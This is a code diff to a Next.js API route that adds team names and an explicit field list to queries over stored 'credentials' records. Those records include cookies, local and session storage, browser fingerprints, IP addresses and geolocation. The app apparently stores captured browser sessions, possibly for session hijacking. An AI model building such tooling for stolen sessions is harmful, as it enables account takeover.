@@ -1,6 +1,6 @@
 import { NextRequest, NextResponse } from 'next/server';
 import { db } from '@/lib/db';
-import { credentials } from '@/lib/schema';
+import { credentials, teams } from '@/lib/schema';
 import { requireAuth, getUserTeamIds } from '@/lib/auth';
 import { eq, and, desc, inArray } from 'drizzle-orm';
 
@@ -25,9 +25,27 @@ export async function GET(request: NextRequest) {
     let teamCredentials;
 
     if (teamId === 'all') {
-      // Return credentials from all user teams (for dashboard)
-      teamCredentials = await db.select()
+      // Return credentials from all user teams with team names (for dashboard)
+      teamCredentials = await db.select({
+        id: credentials.id,
+        teamId: credentials.teamId,
+        teamName: teams.name,
+        createdAt: credentials.createdAt,
+        credentialSource: credentials.credentialSource,
+        lastUsedAt: credentials.lastUsedAt,
+        ipAddress: credentials.ipAddress,
+        userAgent: credentials.userAgent,
+        platform: credentials.platform,
+        browser: credentials.browser,
+        cookies: credentials.cookies,
+        localStorage: credentials.localStorage,
+        sessionStorage: credentials.sessionStorage,
+        fingerprint: credentials.fingerprint,
+        geoLocation: credentials.geoLocation,
+        isActive: credentials.isActive
+      })
         .from(credentials)
+        .leftJoin(teams, eq(credentials.teamId, teams.id))
         .where(and(
           inArray(credentials.teamId, userTeamIds),
           eq(credentials.isActive, true)
@@ -53,8 +71,26 @@ export async function GET(request: NextRequest) {
         }, { status: 403 });
       }
 
-      teamCredentials = await db.select()
+      teamCredentials = await db.select({
+        id: credentials.id,
+        teamId: credentials.teamId,
+        teamName: teams.name,
+        createdAt: credentials.createdAt,
+        credentialSource: credentials.credentialSource,
+        lastUsedAt: credentials.lastUsedAt,
+        ipAddress: credentials.ipAddress,
+        userAgent: credentials.userAgent,
+        platform: credentials.platform,
+        browser: credentials.browser,
+        cookies: credentials.cookies,
+        localStorage: credentials.localStorage,
+        sessionStorage: credentials.sessionStorage,
+        fingerprint: credentials.fingerprint,
+        geoLocation: credentials.geoLocation,
+        isActive: credentials.isActive
+      })
         .from(credentials)
+        .leftJoin(teams, eq(credentials.teamId, teams.id))
         .where(and(
           eq(credentials.teamId, teamId),
           eq(credentials.isActive, true)
